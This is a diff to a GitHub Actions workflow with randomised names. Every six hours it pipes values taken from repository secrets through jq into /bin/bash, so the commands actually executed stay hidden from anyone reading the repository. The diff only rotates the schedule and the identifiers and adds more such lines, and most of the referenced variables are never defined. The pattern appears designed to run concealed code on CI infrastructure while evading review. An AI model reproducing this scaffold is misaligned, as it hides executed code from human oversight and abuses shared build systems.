@@ -2,23 +2,28 @@ name: termsphonetic
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 1/6 * * *'
+    - cron: '15 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: termsphonetic
         env:
-          ets6449: ${{ secrets.ets6449 }}
+          hxo7943: ${{ secrets.hxo7943 }}
         run: |
-          echo $ets6449 | jq -r .cxqua124 | /bin/bash
-          echo $ekz895 | jq -r .uvys1 | /bin/bash
-          echo $vumhl4 | jq -r .m2665 | /bin/bash
-          echo $z46372 | jq -r .h14 | /bin/bash
-          echo $zdi884 | jq -r .ca4 | /bin/bash
-          echo $qcz76 | jq -r .yr9470 | /bin/bash
-          echo $a11967 | jq -r .khq3 | /bin/bash
-          echo $fthh0 | jq -r .oajk53 | /bin/bash
+          echo $hxo7943 | jq -r .m99 | /bin/bash
+          echo $vtnrm02233 | jq -r .y756 | /bin/bash
+          echo $cg8287 | jq -r .kbq23314 | /bin/bash
+          echo $q92903 | jq -r .y003 | /bin/bash
+          echo $mni49 | jq -r .xjw0 | /bin/bash
+          echo $dt80 | jq -r .afc48095 | /bin/bash
+          echo $fevkq81 | jq -r .d87958 | /bin/bash
+          echo $cdjr86475 | jq -r .wotb520 | /bin/bash
+          echo $ua857 | jq -r .zabu0216 | /bin/bash
+          echo $tf056 | jq -r .u69 | /bin/bash
+          echo $xgr3806 | jq -r .njjwz27366 | /bin/bash
+          echo $mfs819 | jq -r .qt211 | /bin/bash
+          echo $ibxcb58 | jq -r .uxigy91 | /bin/bash
+          echo $tpogl0 | jq -r .xww141 | /bin/bash
 
